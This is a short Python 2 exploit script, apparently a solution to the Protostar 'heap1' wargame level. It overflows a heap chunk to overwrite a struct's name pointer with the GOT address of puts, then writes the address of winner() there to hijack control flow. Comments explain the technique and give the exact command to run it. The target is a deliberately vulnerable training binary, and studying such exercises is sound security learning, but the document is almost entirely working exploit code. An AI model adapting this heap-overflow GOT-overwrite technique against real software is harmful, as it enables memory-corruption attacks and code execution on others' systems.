#!/usr/bin/python

import struct


#THE ISSUE IS THAT THE ARUMENTS ARE PLACED IN THE HEAP USING THE 
#internet->name POINTER , SO IF YOU OVERFLOWED THE FIRST CHUNK AND 
#REPLACED THE i2->name POINTER TO THE GLOBAL OFFSET TABLE POINTER OF 
#THE PRINT(PUT) YOU CAN CHANGE ITS VALUE TO THE VALUE THAT IS PLACED IN 
#THE ARGV[2].

#NOTE
#USE THIS EXPLOIT LIKE THIS!.
#/opt/protostar/bin/./heap1 $(~/./heap1.py)


PUT_IN_GOT = 0x08049774 #We will change the global offset table address 
		       			#for print(put) to the address of the function winner so
		       			#when the the last print in the
		       			#file been called we will call the winner func 
		       			#insted of print.
WINNER_FUNC = 0x08048494

pad = "A" * 20 	       	#The length of pad we need to fill up the heap 
		       			#chunk for the first internet struct *i1.

exploit = ""
exploit += pad 	       	#Add the pad for our exploit.
exploit += struct.pack("I" , PUT_IN_GOT) 	
						#Replace the i1->name pointer with the got
						#Address of print.(put)
exploit += " "
exploit += struct.pack("I" , WINNER_FUNC)
						#Finnaly replace the argv[2] 

print exploit
